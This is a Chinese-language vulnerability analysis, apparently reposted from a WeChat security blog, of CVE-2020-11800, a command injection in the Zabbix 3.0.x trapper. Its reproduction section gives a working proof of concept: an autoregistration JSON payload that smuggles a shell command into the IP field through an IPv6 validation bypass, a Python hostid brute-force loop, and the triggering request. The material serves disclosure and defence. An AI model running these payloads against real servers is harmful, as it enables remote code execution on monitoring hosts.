version="1.0" encoding="utf-8"?

# 【原创漏洞】CVE-2020-11800 Zabbix远程代码执行漏洞

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzU1NzcxNjAyMQ==&mid=2247483950&idx=1&sn=fb18e8ac1d4c26020fa626f6c4039b06&chksm=fc30c574cb474c62b6a7617b4bcb6c983a2f76fb96e7a41112f8bee220fed799b9cdfddb56f3&scene=126&sessionid=1681400524#rd](http://mp.weixin.qq.com/s?__biz=MzU1NzcxNjAyMQ==&mid=2247483950&idx=1&sn=fb18e8ac1d4c26020fa626f6c4039b06&chksm=fc30c574cb474c62b6a7617b4bcb6c983a2f76fb96e7a41112f8bee220fed799b9cdfddb56f3&scene=126&sessionid=1681400524#rd)

**漏洞描述**

 

Zabbix Server的trapper命令处理，存在命令注入漏洞，可导致远程代码执行。

 

 

**漏洞影响**

 

远程代码执行

 

CVSSv3 Score

 

9.0 -CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H

 

AC: HIGH 需要服务端配置开启自动注册，或者Zabbix Proxy（会认证主机名）自动发现。

  

  

**影响版本**

 

Zabbix 3.0.x~3.0.30

 

https://www.zabbix.com/cn/download?zabbix=3.0

 

 

**漏洞分析**

 

该漏洞原理与CVE-2017-2824相同，参考：https://talosintelligence.com/reports/TALOS-2017-0325active checks是自动注册的命令字，自动注册的本意是agent可主动将主机注册给server进行监控，在2.2.18版本中可以在IP中注入（参见上文的版本分析处，2.2.19版本才增加了ip校验）shell命令。CVE-2017-2824提到的漏洞在discoverydata命令字即自动发现功能中，由于没有校验IP，导致可在IP中写入shell命令，进而在执行scriptcmd时达到命令注入。比如在IP中写入内容

 

;touch /tmp/zabbix\_pwned

 

 

那么执行ping命令时就变为

 

 

/bin/ping -c 3 ;touch /tmp/zabbix\_pwned 2>&1

  

 

 

CVE-2017-2824在3.0.x的修复办法是，对IP进行校验，代码如下：

![](../Images/a69efeafa90251e8eb044bb85e89410c.png)

但是校验IP的方法可以被绕过，Ipv4校验没问题，ipv6校验可绕过:

![](../Images/46694d269dc958132f25557935197767.png)

输入为ffff:::;touch/tmp/1234pwn即可绕过，进而实现命令注入。

  

**漏洞复现**

**添加自动注册规则**

 

访问portal登录，依次点击菜单Configuration->Actions，将Event source调整为Autoregistration

![](../Images/a13c203d3068cb581296190dd929c82b.png)

点击Create action后，第一个页签随便写一个名字

![](../Images/e4144c5dd4aae5243ca2b64fbe740c76.png)

第二个页签设置条件

![](../Images/6e9605d4334e18ee93ea17c88984747f.png)

  

可配置host name、proxy和host metadata包含或不包含某个关键字，为了复现方便这里留空。

 

第三个页签，指定操作，可以为发送消息、添加主机等，这里要选择Addhost。

![](../Images/0b47a4dd5026730ea2e3770e309c29aa.png)

以上规则的意思就是任意自动注册的host，没有任何拒绝规则，都会直接添加到server中。

 

**注册****host**

 

 

{"request":"activechecks","host":"helloworld","ip":"ffff:::;touch/tmp/1234pwn"}

 

 

执行以上trapper命令，利用自动注册添加host

 

**暴破****hostid**

 

利用command命令字，暴破得到上一步添加的host的id

def hostid\_bruteforce():

 

for ip in ipList:

 

try:

 

for i in range(10000, 20000):

 

cmd\_fmt ='{"request":"command","scriptid":"3","hostid":"%d","nodeid":"0"}'cmd = cmd\_fmt%i

 

rsp = doCmd(ip, cmd)

 

try:

 

r = json.loads(rsp)\['response'\]

 

if r == 'success':

 

print 'hostid = %d' % i

 

except Exception as e:

 

print e

 

except Exception as e:

 

print e

  

**触发命令注入**

 

 

{"request":"command","scriptid":"1","hostid":"10106","nodeid":"0"}

 

 

执行ping命令，在server主机生成/tmp/1234pwn文件，注入成功。

  

  

**修复建议** 

  

正确限制IP 

  

**附录 **

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11800 https://support.zabbix.com/browse/ZBX-17600 https://support.zabbix.com/browse/ZBXSEC-30